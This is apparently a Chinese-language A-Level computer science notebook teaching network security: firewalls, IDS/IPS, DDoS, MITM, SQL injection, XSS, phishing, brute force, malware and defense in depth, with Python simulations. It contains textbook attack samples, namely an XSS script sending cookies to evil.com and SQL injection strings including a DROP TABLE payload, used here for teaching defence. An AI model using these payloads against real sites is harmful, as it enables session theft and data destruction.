# 第三节：网络安全与防御 (Network Security and Defense)

## Cambridge A-Level CS (9618) - A2 Level

---

## 本节学习目标

通过本节学习，你将能够：

1. **理解防火墙 (Firewall)** 的三种类型及其工作原理
2. **掌握入侵检测/防御系统 (IDS/IPS)** 的两种检测方法
3. **深入分析六种常见网络攻击**：DDoS、MITM、SQL注入、XSS、钓鱼攻击、暴力破解
4. **区分七种恶意软件 (Malware)** 的传播方式和危害
5. **掌握纵深防御 (Defense in Depth)** 等防御策略
6. **了解量子计算 (Quantum Computing)** 对当前加密技术的威胁
7. 通过交互式 Python 演示加深理解

---

### 为什么网络安全如此重要？

在互联网时代，网络攻击每天都在发生。2025年全球网络犯罪造成的损失预计超过 **10万亿美元**。
作为计算机科学的学生，理解网络安全不仅是考试要求，更是未来职业发展的基础技能。

| 概念 | 英文术语 | 简要说明 |
|------|----------|----------|
| 防火墙 | Firewall | 监控和过滤网络流量的安全设备 |
| 入侵检测 | IDS (Intrusion Detection System) | 检测可疑网络活动 |
| 入侵防御 | IPS (Intrusion Prevention System) | 检测并阻止可疑活动 |
| 恶意软件 | Malware | 用于破坏、窃取或控制系统的软件 |
| 纵深防御 | Defense in Depth | 多层次安全防护策略 |

## 一、防火墙 (Firewall)

### 1.1 什么是防火墙？

**防火墙 (Firewall)** 是一种网络安全设备（可以是硬件或软件），它根据预设的安全规则来
**监控和过滤进出网络的数据流量**。

就像小区的保安一样，防火墙决定哪些数据包可以通过，哪些应该被拒绝。

```
  互联网 (Internet)
       |
       v
  +-----------+
  |  防火墙    |  <-- 检查每个数据包
  |  Firewall  |
  +-----------+
       |
       v
  内部网络 (Internal Network)
  [电脑] [服务器] [打印机]
```

---

### 1.2 防火墙的三种类型

#### (1) 包过滤防火墙 (Packet Filtering Firewall)

**工作原理：** 检查每个数据包 (packet) 的**头部信息 (header)**，根据预设规则决定是否放行。

检查的信息包括：
- **源 IP 地址** (Source IP Address) - 数据从哪里来
- **目标 IP 地址** (Destination IP Address) - 数据要去哪里
- **源端口号** (Source Port) - 发送方的端口
- **目标端口号** (Destination Port) - 接收方的端口
- **协议类型** (Protocol) - TCP、UDP、ICMP 等

**优点：**
- 速度快 (fast) - 只检查头部，不看内容
- 实现简单，成本低
- 对网络性能影响小

**缺点：**
- 不检查数据内容 (payload)，无法防御应用层攻击
- 无法追踪连接状态
- 容易被 IP 欺骗 (IP Spoofing) 绕过

---

#### (2) 状态检测防火墙 (Stateful Inspection Firewall)

**工作原理：** 不仅检查数据包头部，还**维护一个连接状态表 (State Table)**，
追踪每个网络连接的完整生命周期。

```
状态表 (State Table) 示例：
+----------+----------+--------+--------+--------+
| 源IP     | 目标IP   | 源端口 | 目标端口| 状态   |
+----------+----------+--------+--------+--------+
| 10.0.0.1 | 8.8.8.8  | 50234  | 443    | 已建立 |
| 10.0.0.2 | 1.1.1.1  | 49876  | 80     | 等待中 |
+----------+----------+--------+--------+--------+
```

**优点：**
- 比包过滤更安全 - 能识别伪造的连接
- 可以追踪 TCP 三次握手等连接过程
- 能检测到某些类型的攻击（如 SYN Flood）

**缺点：**
- 比包过滤慢，消耗更多资源
- 状态表可能被攻击者填满（状态表耗尽攻击）
- 仍然不检查应用层数据

---

#### (3) 应用层网关 / 代理防火墙 (Application-Level Gateway / Proxy Firewall)

**工作原理：** 作为**代理 (Proxy)** 在客户端和服务器之间中转通信。
它能**深度检查应用层数据内容**，理解 HTTP、FTP、DNS 等协议的含义。

```
  客户端                代理防火墙               服务器
  Client    ------>    Proxy Firewall   ------>  Server
            请求发给代理   代理检查后转发    代理发出新请求
  Client    <------    Proxy Firewall   <------  Server
            代理返回响应   代理检查响应      服务器回复代理
```

**优点：**
- 安全性最高 - 能检查数据内容
- 可以阻止恶意代码、SQL注入等
- 隐藏内部网络结构（外部只看到代理的IP）
- 可以缓存 (cache) 数据，提高效率

**缺点：**
- 速度最慢 - 需要完全解析应用层数据
- 配置复杂
- 可能不支持所有协议
- 成本最高

---

### 1.3 三种防火墙对比总结

| 特性 | 包过滤 | 状态检测 | 应用层网关 |
|------|--------|----------|------------|
| 检查层次 | 网络层/传输层 | 网络层/传输层 | 应用层 |
| 速度 | 最快 | 中等 | 最慢 |
| 安全性 | 最低 | 中等 | 最高 |
| 成本 | 最低 | 中等 | 最高 |
| 追踪连接状态 | 否 | 是 | 是 |
| 检查数据内容 | 否 | 否 | 是 |

In [ ]:
# === 环境配置：中文字体支持 ===
import matplotlib.pyplot as plt
import matplotlib
matplotlib.rcParams['font.sans-serif'] = ['WenQuanYi Zen Hei', 'Noto Sans CJK SC', 'SimHei', 'DejaVu Sans']
matplotlib.rcParams['axes.unicode_minus'] = False

import matplotlib.patches as mpatches
import numpy as np
import math
import string
import re
import random
import time
from collections import Counter

print("环境配置完成！所有库已导入。")

In [ ]:
# === 防火墙规则模拟器 (Firewall Rule Simulator) ===

class PacketFilterFirewall:
    """
    包过滤防火墙模拟器
    模拟最基本的防火墙 - 根据 IP、端口、协议来过滤数据包
    """
    
    def __init__(self):
        # 规则列表：每条规则是一个字典
        # action: ALLOW（允许）或 DENY（拒绝）
        self.rules = []
        # 默认策略：如果没有匹配的规则，使用默认策略
        self.default_policy = "DENY"  # 默认拒绝 - 这是更安全的做法
    
    def add_rule(self, rule):
        """
        添加一条防火墙规则
        rule 格式: {
            'action': 'ALLOW' 或 'DENY',
            'src_ip': 源IP（'*' 表示任意）,
            'dst_ip': 目标IP（'*' 表示任意）,
            'dst_port': 目标端口（'*' 表示任意）,
            'protocol': 协议（'*' 表示任意）,
            'description': 规则说明
        }
        """
        self.rules.append(rule)
        print(f"  [+] 规则已添加: {rule['description']}")
    
    def check_packet(self, packet):
        """
        检查一个数据包是否被允许通过
        按规则顺序匹配，第一条匹配的规则生效
        """
        print(f"\n--- 检查数据包 ---")
        print(f"  源IP: {packet['src_ip']}")
        print(f"  目标IP: {packet['dst_ip']}")
        print(f"  目标端口: {packet['dst_port']}")
        print(f"  协议: {packet['protocol']}")
        
        for i, rule in enumerate(self.rules):
            if self._match_rule(rule, packet):
                action = rule['action']
                symbol = "[PASS]" if action == "ALLOW" else "[BLOCK]"
                print(f"  >>> 匹配规则 #{i+1}: {rule['description']}")
                print(f"  >>> 结果: {symbol} {action}")
                return action
        
        # 没有匹配的规则，使用默认策略
        print(f"  >>> 无匹配规则，使用默认策略: {self.default_policy}")
        return self.default_policy
    
    def _match_rule(self, rule, packet):
        """检查数据包是否匹配某条规则"""
        if rule['src_ip'] != '*' and rule['src_ip'] != packet['src_ip']:
            return False
        if rule['dst_ip'] != '*' and rule['dst_ip'] != packet['dst_ip']:
            return False
        if rule['dst_port'] != '*' and str(rule['dst_port']) != str(packet['dst_port']):
            return False
        if rule['protocol'] != '*' and rule['protocol'] != packet['protocol']:
            return False
        return True


# ===== 创建防火墙并添加规则 =====
print("========================================")
print("   包过滤防火墙模拟器 (Packet Filter)")
print("========================================\n")

fw = PacketFilterFirewall()

# 添加规则（按优先级顺序）
print("--- 添加防火墙规则 ---")
fw.add_rule({
    'action': 'ALLOW', 'src_ip': '*', 'dst_ip': '*',
    'dst_port': 80, 'protocol': 'TCP',
    'description': '允许所有 HTTP 流量（端口80）'
})
fw.add_rule({
    'action': 'ALLOW', 'src_ip': '*', 'dst_ip': '*',
    'dst_port': 443, 'protocol': 'TCP',
    'description': '允许所有 HTTPS 流量（端口443）'
})
fw.add_rule({
    'action': 'DENY', 'src_ip': '192.168.1.100', 'dst_ip': '*',
    'dst_port': '*', 'protocol': '*',
    'description': '封禁可疑IP 192.168.1.100 的所有流量'
})
fw.add_rule({
    'action': 'ALLOW', 'src_ip': '10.0.0.*', 'dst_ip': '*',
    'dst_port': 22, 'protocol': 'TCP',
    'description': '允许内网 SSH 访问（端口22）'
})
fw.add_rule({
    'action': 'DENY', 'src_ip': '*', 'dst_ip': '*',
    'dst_port': 23, 'protocol': 'TCP',
    'description': '拒绝所有 Telnet 流量（不安全协议）'
})

# ===== 测试数据包 =====
print("\n" + "=" * 40)
print("   开始检查数据包")
print("=" * 40)

test_packets = [
    {'src_ip': '203.0.113.5', 'dst_ip': '10.0.0.1', 'dst_port': 80, 'protocol': 'TCP',
     'desc': '正常的网页浏览请求'},
    {'src_ip': '192.168.1.100', 'dst_ip': '10.0.0.1', 'dst_port': 443, 'protocol': 'TCP',
     'desc': '被封禁IP的HTTPS请求'},
    {'src_ip': '8.8.8.8', 'dst_ip': '10.0.0.1', 'dst_port': 23, 'protocol': 'TCP',
     'desc': 'Telnet连接尝试（不安全）'},
    {'src_ip': '172.16.0.5', 'dst_ip': '10.0.0.1', 'dst_port': 3306, 'protocol': 'TCP',
     'desc': '外部MySQL数据库访问尝试'},
]

for pkt in test_packets:
    print(f"\n{'*' * 45}")
    print(f"  场景: {pkt['desc']}")
    fw.check_packet(pkt)

## 二、入侵检测/防御系统 (IDS/IPS)

### 2.1 IDS vs IPS 的区别

| 特性 | IDS（入侵检测系统） | IPS（入侵防御系统） |
|------|---------------------|---------------------|
| 英文全称 | Intrusion Detection System | Intrusion Prevention System |
| 核心功能 | **检测**并报警 | **检测并阻止**攻击 |
| 部署位置 | 网络旁路（被动监听） | 网络直路（串联部署） |
| 响应方式 | 发出警报，由管理员处理 | 自动阻断恶意流量 |
| 类比 | 安保摄像头 - 只录像报警 | 自动门禁 - 发现异常直接拦截 |

```
IDS 部署方式（旁路）：              IPS 部署方式（串联）：

互联网 ---> 交换机 ---> 内网       互联网 ---> [IPS] ---> 内网
               |                              |
              [IDS]                     检测+自动阻断
               |
           只监听报警
```

---

### 2.2 两种检测方法

#### (1) 基于签名的检测 (Signature-based Detection)

**原理：** 维护一个已知攻击特征的数据库（类似病毒库），将网络流量与已知攻击模式进行匹配。

**类比：** 就像警察拿着通缉犯的照片在人群中搜索。

**优点：**
- 对已知攻击检测准确率高
- 误报率 (False Positive Rate) 低
- 能明确告诉你是什么类型的攻击

**缺点：**
- **无法检测未知攻击**（零日攻击 / Zero-day Attack）
- 需要频繁更新签名数据库
- 攻击者可以修改攻击代码来绕过检测

---

#### (2) 基于异常的检测 (Anomaly-based Detection)

**原理：** 首先建立网络的**正常行为基线 (Baseline)**，然后检测偏离基线的异常行为。

**类比：** 就像老师注意到一个平时很安静的学生突然变得很吵闹。

**优点：**
- **能检测未知攻击和零日攻击**
- 不需要预先知道攻击特征
- 可以使用机器学习来提高准确率

**缺点：**
- 误报率 (False Positive Rate) 较高
- 需要时间建立准确的基线
- 正常行为变化时需要重新训练

---

### 2.3 对比总结

| 特性 | 签名检测 | 异常检测 |
|------|----------|----------|
| 检测已知攻击 | 非常好 | 一般 |
| 检测未知攻击 | 不能 | 能 |
| 误报率 | 低 | 高 |
| 维护成本 | 需更新签名库 | 需训练模型 |
| 最佳实践 | 两种方法结合使用 | 两种方法结合使用 |

## 三、常见网络攻击详解

### 3.1 DDoS 攻击 (Distributed Denial of Service)

**中文名：** 分布式拒绝服务攻击

**原理：** 攻击者控制大量被感染的计算机（称为 **僵尸网络 / Botnet**），
同时向目标服务器发送海量请求，使服务器资源耗尽，无法为正常用户提供服务。

```
  攻击者 (Attacker)
       |
       v
  命令与控制服务器 (C&C Server)
       |
       +----> 僵尸机1 (Bot) ---+
       +----> 僵尸机2 (Bot) ---+----> 目标服务器 (Target)
       +----> 僵尸机3 (Bot) ---+      服务器崩溃！
       +----> ...成千上万台 ----+      正常用户无法访问
```

**DDoS 的类型：**
- **流量型攻击 (Volumetric):** 用大量流量淹没带宽（如 UDP Flood）
- **协议型攻击 (Protocol):** 利用协议漏洞耗尽资源（如 SYN Flood）
- **应用层攻击 (Application Layer):** 发送大量看似合法的请求（如 HTTP Flood）

**防御措施：**
- 使用 CDN (Content Delivery Network) 分散流量
- 配置流量清洗服务 (Traffic Scrubbing)
- 设置速率限制 (Rate Limiting)
- 使用 Anycast 网络分散攻击流量

---

### 3.2 中间人攻击 (Man-in-the-Middle, MITM)

**原理：** 攻击者秘密地插入到两个通信方之间，**截获、篡改或窃听**双方的通信内容。
双方都以为自己在直接和对方通信，实际上所有数据都经过了攻击者。

```
正常通信：
  Alice  <=========>  Bob
         直接通信

MITM攻击：
  Alice  <===> 攻击者 (Eve) <===> Bob
         Alice以为在跟Bob说话
         Bob以为在跟Alice说话
         Eve可以窃听/篡改所有内容！
```

**常见场景：**
- 公共WiFi中的ARP欺骗 (ARP Spoofing)
- DNS欺骗 (DNS Spoofing)
- HTTPS降级攻击 (SSL Stripping)

**防御措施：**
- 使用 HTTPS（TLS/SSL加密）
- 验证数字证书 (Digital Certificate)
- 使用 VPN 加密通信
- 避免使用公共WiFi进行敏感操作

---

### 3.3 SQL 注入 (SQL Injection)

**原理：** 攻击者在Web应用的输入字段中插入恶意的SQL代码，
如果应用没有正确过滤用户输入，这些SQL代码会被数据库执行，
导致数据泄露、数据篡改甚至整个数据库被删除。

**示例：**
```
正常登录：
  用户名: admin
  密码: mypassword
  SQL: SELECT * FROM users WHERE name='admin' AND pass='mypassword'

SQL注入攻击：
  用户名: admin' OR '1'='1' --
  密码: (任意)
  SQL: SELECT * FROM users WHERE name='admin' OR '1'='1' --' AND pass='...'
  结果: '1'='1' 永远为真，攻击者无需密码即可登录！
```

**防御措施：**
- 使用**参数化查询 (Parameterized Queries)** / 预编译语句
- 输入验证和过滤 (Input Validation)
- 最小权限原则 - 数据库账户只授予必要权限
- 使用 Web 应用防火墙 (WAF)

---

### 3.4 跨站脚本攻击 (Cross-Site Scripting, XSS)

**原理：** 攻击者将恶意的 JavaScript 代码注入到网页中，
当其他用户浏览该网页时，恶意代码会在用户的浏览器中执行，
可以窃取 Cookie、会话令牌等敏感信息。

**XSS 的类型：**
- **反射型 (Reflected):** 恶意代码在URL参数中，服务器将其反射回页面
- **存储型 (Stored):** 恶意代码存储在服务器（如论坛帖子），影响所有访问者
- **DOM型 (DOM-based):** 在客户端JavaScript中动态修改DOM时触发

**示例：**
```
攻击者在评论区输入：
  <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>

当其他用户浏览评论时，脚本执行，Cookie被发送到攻击者的服务器。
```

**防御措施：**
- **输出编码 (Output Encoding):** 将特殊字符转义（如 < 变为 &lt;）
- **内容安全策略 (CSP - Content Security Policy)**
- 输入验证和过滤
- 使用 HttpOnly 标记保护 Cookie

---

### 3.5 钓鱼攻击和社会工程学 (Phishing & Social Engineering)

**钓鱼攻击 (Phishing):**
攻击者伪装成可信的实体（如银行、电商平台），通过邮件、短信或虚假网站，
诱骗用户提供敏感信息（密码、银行卡号等）。

**社会工程学 (Social Engineering):**
利用人的心理弱点（信任、恐惧、贪婪、好奇心）来获取信息或权限。
不依赖技术漏洞，而是利用**人的漏洞**。

**常见手法：**
- **鱼叉式钓鱼 (Spear Phishing):** 针对特定个人的精准钓鱼
- **尾随 (Tailgating):** 跟着授权人员进入受限区域
- **借口 (Pretexting):** 编造身份和故事来获取信息
- **诱饵 (Baiting):** 放置感染恶意软件的U盘

**防御措施：**
- 安全意识培训 (Security Awareness Training)
- 验证发件人身份
- 不点击可疑链接
- 使用多因素认证 (MFA)

---

### 3.6 暴力破解攻击 (Brute Force Attack)

**原理：** 攻击者系统性地尝试所有可能的密码组合，直到找到正确的密码。

**类型：**
- **纯暴力破解 (Pure Brute Force):** 尝试每一种组合
- **字典攻击 (Dictionary Attack):** 使用常见密码列表
- **彩虹表攻击 (Rainbow Table):** 使用预计算的哈希值表
- **混合攻击 (Hybrid):** 字典+暴力组合

**防御措施：**
- 使用强密码（长度、复杂度）
- 账户锁定策略 (Account Lockout)
- 添加延迟 (Throttling) - 连续失败后增加等待时间
- 使用验证码 (CAPTCHA)
- 使用加盐哈希 (Salted Hash) 存储密码
- 多因素认证 (MFA)

In [ ]:
# === 攻击类型对比可视化 ===

fig, ax = plt.subplots(figsize=(14, 7))

attacks = ['DDoS\n分布式拒绝服务', 'MITM\n中间人攻击', 'SQL Injection\nSQL注入',
           'XSS\n跨站脚本', 'Phishing\n钓鱼攻击', 'Brute Force\n暴力破解']

# 各维度评分（1-10）
severity = [9, 8, 9, 7, 8, 5]      # 严重程度
frequency = [8, 6, 8, 7, 9, 7]     # 发生频率
difficulty = [4, 6, 5, 5, 3, 2]    # 实施难度（越高越难）

x = np.arange(len(attacks))
width = 0.25

bars1 = ax.bar(x - width, severity, width, label='严重程度 (Severity)',
               color='#e74c3c', edgecolor='white', linewidth=0.5)
bars2 = ax.bar(x, frequency, width, label='发生频率 (Frequency)',
               color='#f39c12', edgecolor='white', linewidth=0.5)
bars3 = ax.bar(x + width, difficulty, width, label='实施难度 (Difficulty)',
               color='#3498db', edgecolor='white', linewidth=0.5)

# 添加数值标签
for bars in [bars1, bars2, bars3]:
    for bar in bars:
        height = bar.get_height()
        ax.annotate(f'{int(height)}',
                    xy=(bar.get_x() + bar.get_width() / 2, height),
                    xytext=(0, 3), textcoords='offset points',
                    ha='center', va='bottom', fontsize=9, fontweight='bold')

ax.set_ylabel('评分 (1-10)', fontsize=12)
ax.set_title('六种常见网络攻击对比分析', fontsize=16, fontweight='bold', pad=20)
ax.set_xticks(x)
ax.set_xticklabels(attacks, fontsize=10)
ax.legend(fontsize=11, loc='upper right')
ax.set_ylim(0, 11)
ax.grid(axis='y', alpha=0.3)
ax.spines['top'].set_visible(False)
ax.spines['right'].set_visible(False)

plt.tight_layout()
plt.show()

print("\n说明：")
print("- 严重程度：攻击成功后造成的损害程度")
print("- 发生频率：该类攻击在现实中出现的频率")
print("- 实施难度：攻击者实施该攻击所需的技术水平（越高越难）")

In [ ]:
# === SQL 注入演示（安全模拟） ===

print("=" * 55)
print("   SQL 注入攻击模拟演示 (Safe Simulation)")
print("=" * 55)
print("\n注意：这是一个教学演示，展示SQL注入的原理。")
print("      在真实环境中进行未经授权的攻击是违法的！\n")

# 模拟一个简单的用户数据库
fake_database = {
    'users': [
        {'id': 1, 'username': 'admin', 'password': 'admin123', 'role': 'administrator'},
        {'id': 2, 'username': 'alice', 'password': 'alice_pwd', 'role': 'user'},
        {'id': 3, 'username': 'bob', 'password': 'bob_secure', 'role': 'user'},
    ]
}

def unsafe_login(username, password):
    """
    不安全的登录函数 - 直接拼接SQL字符串（千万不要这样做！）
    """
    # 模拟不安全的SQL查询构造
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"  生成的SQL: {query}")
    
    # 检查是否存在注入
    if "' OR '1'='1" in username or "' OR '1'='1" in password:
        print("  [!!!] 检测到SQL注入！条件永真，返回所有用户！")
        return fake_database['users']  # 返回所有数据
    if "'; DROP TABLE" in username or "'; DROP TABLE" in password:
        print("  [!!!] 检测到DROP TABLE注入！数据库表将被删除！")
        return "TABLE DROPPED!"
    
    # 正常查询
    for user in fake_database['users']:
        if user['username'] == username and user['password'] == password:
            return [user]
    return []

def safe_login(username, password):
    """
    安全的登录函数 - 使用参数化查询的思想
    """
    # 模拟参数化查询：输入被当作纯数据，不会被解释为SQL代码
    print(f"  参数化查询: SELECT * FROM users WHERE username=? AND password=?")
    print(f"  参数: ['{username}', '{password}']")
    
    for user in fake_database['users']:
        if user['username'] == username and user['password'] == password:
            return [user]
    return []

# 测试场景
print("--- 场景1: 正常登录 ---")
result = unsafe_login('admin', 'admin123')
print(f"  结果: 找到 {len(result)} 个用户\n")

print("--- 场景2: SQL注入攻击（不安全的函数）---")
result = unsafe_login("admin' OR '1'='1' --", "anything")
if isinstance(result, list) and len(result) > 1:
    print(f"  结果: 返回了 {len(result)} 个用户的数据！数据泄露！")
    for u in result:
        print(f"    - {u['username']} (角色: {u['role']})")

print("\n--- 场景3: 同样的注入攻击（安全的函数）---")
result = safe_login("admin' OR '1'='1' --", "anything")
print(f"  结果: 找到 {len(result)} 个用户 - 注入失败！系统安全！")

print("\n--- 场景4: DROP TABLE 攻击（不安全的函数）---")
result = unsafe_login("'; DROP TABLE users; --", "anything")
print(f"  结果: {result}")

print("\n" + "=" * 55)
print("  教训：永远使用参数化查询，不要拼接SQL字符串！")
print("=" * 55)

## 四、恶意软件详解 (Malware)

**恶意软件 (Malware)** 是 Malicious Software 的缩写，指任何设计用来损害、
利用或以其他方式对计算机系统产生不良影响的软件。

### 4.1 七种主要恶意软件类型

---

#### (1) 病毒 (Virus)
- **传播方式：** 附着在合法程序或文件上，当用户运行被感染的程序时激活并传播
- **特点：** **需要宿主程序**才能运行，不能独立执行
- **危害：** 破坏文件、降低系统性能、删除数据
- **类比：** 就像生物病毒需要寄生在细胞中才能繁殖

#### (2) 蠕虫 (Worm)
- **传播方式：** 利用网络漏洞**自动传播**，不需要用户操作
- **特点：** **独立运行**，不需要宿主程序；可以自我复制
- **危害：** 消耗网络带宽、占用系统资源、为其他攻击开后门
- **著名案例：** WannaCry（2017年）、Code Red、Slammer
- **类比：** 像一个可以自己爬行的虫子，到处感染

#### (3) 特洛伊木马 (Trojan Horse)
- **传播方式：** 伪装成有用的软件，诱骗用户主动下载安装
- **特点：** **欺骗性** - 外表看起来是正常软件，实际包含恶意功能
- **危害：** 窃取信息、开后门 (Backdoor)、下载其他恶意软件
- **类比：** 就像古希腊的特洛伊木马 - 外面是礼物，里面藏着敌人

#### (4) 勒索软件 (Ransomware)
- **传播方式：** 通过钓鱼邮件、恶意网站、漏洞利用
- **特点：** **加密用户文件**，然后要求支付赎金（通常是加密货币）才能解密
- **危害：** 数据被加密无法访问、经济损失
- **著名案例：** WannaCry、NotPetya、REvil
- **类比：** 像绑匪绑架了你的文件，要你交赎金

#### (5) Rootkit
- **传播方式：** 通常由其他恶意软件安装，或利用系统漏洞
- **特点：** 在**操作系统最深层**运行，能隐藏自身和其他恶意软件
- **危害：** 获取最高权限 (root)、极难检测和清除
- **类比：** 像一个隐形的间谍，控制了你家的地基

#### (6) 间谍软件 (Spyware)
- **传播方式：** 捆绑在免费软件中、通过恶意网站
- **特点：** **秘密监控**用户活动，收集个人信息
- **危害：** 窃取密码、浏览记录、键盘记录 (Keylogging)
- **类比：** 像安装在你手机上的窃听器

#### (7) 广告软件 (Adware)
- **传播方式：** 捆绑在免费软件中
- **特点：** 强制显示广告、修改浏览器设置
- **危害：** 影响使用体验、可能包含恶意链接、收集浏览习惯
- **类比：** 像在你家墙上贴满了广告，而且你撕不掉

In [ ]:
# === 恶意软件分类树状图 ===

fig, ax = plt.subplots(figsize=(16, 10))
ax.set_xlim(0, 16)
ax.set_ylim(0, 10)
ax.axis('off')
ax.set_title('恶意软件 (Malware) 分类图', fontsize=18, fontweight='bold', pad=20)

# 根节点
root = mpatches.FancyBboxPatch((6, 8.5), 4, 0.8, boxstyle='round,pad=0.1',
                                facecolor='#2c3e50', edgecolor='white', linewidth=2)
ax.add_patch(root)
ax.text(8, 8.9, 'Malware (恶意软件)', ha='center', va='center',
        fontsize=13, color='white', fontweight='bold')

# 恶意软件类型数据
malware_types = [
    {'name': 'Virus\n病毒', 'x': 1, 'color': '#e74c3c',
     'detail': '需要宿主\n用户触发'},
    {'name': 'Worm\n蠕虫', 'x': 3.3, 'color': '#e67e22',
     'detail': '自动传播\n独立运行'},
    {'name': 'Trojan\n木马', 'x': 5.6, 'color': '#f1c40f',
     'detail': '伪装软件\n欺骗用户'},
    {'name': 'Ransomware\n勒索软件', 'x': 7.9, 'color': '#9b59b6',
     'detail': '加密文件\n索要赎金'},
    {'name': 'Rootkit', 'x': 10.2, 'color': '#1abc9c',
     'detail': '深层隐藏\n最高权限'},
    {'name': 'Spyware\n间谍软件', 'x': 12.5, 'color': '#3498db',
     'detail': '秘密监控\n窃取信息'},
    {'name': 'Adware\n广告软件', 'x': 14.8, 'color': '#95a5a6',
     'detail': '强制广告\n低危害性'},
]

for m in malware_types:
    # 连接线
    ax.plot([8, m['x']], [8.5, 7.0], color='#7f8c8d', linewidth=1.5, linestyle='-')
    
    # 类型框
    box = mpatches.FancyBboxPatch((m['x'] - 0.9, 6.0), 1.8, 0.9,
                                  boxstyle='round,pad=0.1',
                                  facecolor=m['color'], edgecolor='white', linewidth=1.5)
    ax.add_patch(box)
    ax.text(m['x'], 6.45, m['name'], ha='center', va='center',
            fontsize=9, color='white', fontweight='bold')
    
    # 详情框
    ax.plot([m['x'], m['x']], [6.0, 5.2], color='#bdc3c7', linewidth=1)
    detail_box = mpatches.FancyBboxPatch((m['x'] - 0.9, 4.2), 1.8, 0.9,
                                         boxstyle='round,pad=0.1',
                                         facecolor='#ecf0f1', edgecolor=m['color'], linewidth=1.5)
    ax.add_patch(detail_box)
    ax.text(m['x'], 4.65, m['detail'], ha='center', va='center',
            fontsize=8, color='#2c3e50')

# 危害等级标尺
ax.text(8, 2.8, '危害程度从高到低', ha='center', fontsize=12, fontweight='bold')
colors = ['#e74c3c', '#e74c3c', '#e67e22', '#f1c40f', '#f1c40f', '#2ecc71', '#2ecc71']
labels = ['Ransomware', 'Rootkit', 'Worm', 'Trojan', 'Virus', 'Spyware', 'Adware']
for i, (c, l) in enumerate(zip(colors, labels)):
    rect = mpatches.FancyBboxPatch((2 + i * 1.7, 1.8), 1.5, 0.5,
                                   boxstyle='round,pad=0.05',
                                   facecolor=c, alpha=0.7, edgecolor='white')
    ax.add_patch(rect)
    ax.text(2.75 + i * 1.7, 2.05, l, ha='center', va='center',
            fontsize=7, color='white', fontweight='bold')

# 箭头
ax.annotate('', xy=(14.2, 1.5), xytext=(2, 1.5),
            arrowprops=dict(arrowstyle='->', color='#7f8c8d', lw=2))
ax.text(3, 1.2, '高危害', fontsize=10, color='#e74c3c', fontweight='bold')
ax.text(13, 1.2, '低危害', fontsize=10, color='#2ecc71', fontweight='bold')

plt.tight_layout()
plt.show()

## 五、防御策略 (Defense Strategies)

### 5.1 纵深防御 (Defense in Depth)

**纵深防御**是一种多层次的安全策略，即使某一层被突破，后面还有其他层来保护系统。

**核心理念：** 不要把所有鸡蛋放在一个篮子里。每一层防御都是独立的，
攻击者必须突破所有层才能到达核心数据。

```
纵深防御层次（由外到内）：

第1层: 物理安全 (Physical Security)
       - 门禁、监控、机房锁

第2层: 网络安全 (Network Security)
       - 防火墙、IDS/IPS、VPN

第3层: 主机安全 (Host Security)
       - 杀毒软件、系统补丁、端口关闭

第4层: 应用安全 (Application Security)
       - 输入验证、WAF、安全编码

第5层: 数据安全 (Data Security)
       - 加密、访问控制、备份
```

---

### 5.2 安全策略与流程 (Security Policies and Procedures)

| 策略类型 | 英文 | 说明 |
|----------|------|------|
| 可接受使用策略 | Acceptable Use Policy (AUP) | 规定用户如何使用组织的IT资源 |
| 密码策略 | Password Policy | 密码强度、更换周期等要求 |
| 访问控制策略 | Access Control Policy | 谁可以访问什么资源 |
| 事件响应计划 | Incident Response Plan | 安全事件发生后的处理流程 |
| 灾难恢复计划 | Disaster Recovery Plan (DRP) | 系统崩溃后如何恢复 |
| 备份策略 | Backup Policy | 数据备份的频率和方式 |

---

### 5.3 网络分段 (Network Segmentation)

将网络划分为多个**独立的子网 (Subnet)**，每个子网之间通过防火墙或路由器控制访问。

**好处：**
- **限制攻击范围：** 如果一个子网被入侵，攻击者不能轻易访问其他子网
- **提高性能：** 减少广播流量
- **合规要求：** 某些法规要求隔离敏感数据

```
网络分段示例：

互联网
  |
  [外部防火墙]
  |
  +--- DMZ (非军事区) --- Web服务器、邮件服务器
  |
  [内部防火墙]
  |
  +--- 办公网络 --- 员工电脑
  |
  +--- 数据库网络 --- 核心数据库（最高保护级别）
```

**DMZ (Demilitarized Zone / 非军事区)** 是一个特殊的网络区域，
放置需要被外部访问的服务器（如Web服务器），但与内部网络隔离。

In [ ]:
# === 纵深防御层次可视化 ===

fig, ax = plt.subplots(figsize=(12, 9))
ax.set_xlim(0, 12)
ax.set_ylim(0, 10)
ax.axis('off')
ax.set_title('纵深防御 (Defense in Depth) 模型', fontsize=18, fontweight='bold', pad=15)

# 从外到内的防御层
layers = [
    {'label': '第1层: 物理安全 (Physical Security)', 'detail': '门禁系统、监控摄像、安保人员',
     'w': 10, 'h': 8.0, 'x': 1.0, 'y': 1.0, 'color': '#2c3e50'},
    {'label': '第2层: 网络安全 (Network Security)', 'detail': '防火墙、IDS/IPS、VPN',
     'w': 8.4, 'h': 6.5, 'x': 1.8, 'y': 1.6, 'color': '#8e44ad'},
    {'label': '第3层: 主机安全 (Host Security)', 'detail': '杀毒软件、系统补丁更新',
     'w': 6.8, 'h': 5.0, 'x': 2.6, 'y': 2.2, 'color': '#2980b9'},
    {'label': '第4层: 应用安全 (Application Security)', 'detail': '输入验证、安全编码、WAF',
     'w': 5.2, 'h': 3.5, 'x': 3.4, 'y': 2.8, 'color': '#27ae60'},
    {'label': '第5层: 数据安全 (Data Security)', 'detail': '加密、访问控制、备份',
     'w': 3.6, 'h': 2.0, 'x': 4.2, 'y': 3.4, 'color': '#e74c3c'},
]

for layer in layers:
    rect = mpatches.FancyBboxPatch(
        (layer['x'], layer['y']), layer['w'], layer['h'],
        boxstyle='round,pad=0.15', facecolor=layer['color'],
        alpha=0.3, edgecolor=layer['color'], linewidth=2.5
    )
    ax.add_patch(rect)

# 添加标签（从外到内）
label_positions = [
    (6.0, 8.6, layers[0]),
    (6.0, 7.6, layers[1]),
    (6.0, 6.7, layers[2]),
    (6.0, 5.8, layers[3]),
    (6.0, 4.8, layers[4]),
]

for x, y, layer in label_positions:
    ax.text(x, y, layer['label'], ha='center', va='center',
            fontsize=11, fontweight='bold', color=layer['color'])
    ax.text(x, y - 0.35, layer['detail'], ha='center', va='center',
            fontsize=9, color='#555555')

# 核心标签
core = mpatches.FancyBboxPatch((5.0, 3.7), 2.0, 0.8,
                                boxstyle='round,pad=0.1',
                                facecolor='#e74c3c', edgecolor='white', linewidth=2)
ax.add_patch(core)
ax.text(6.0, 4.1, 'Core Data', ha='center', va='center',
        fontsize=12, color='white', fontweight='bold')

# 攻击者箭头
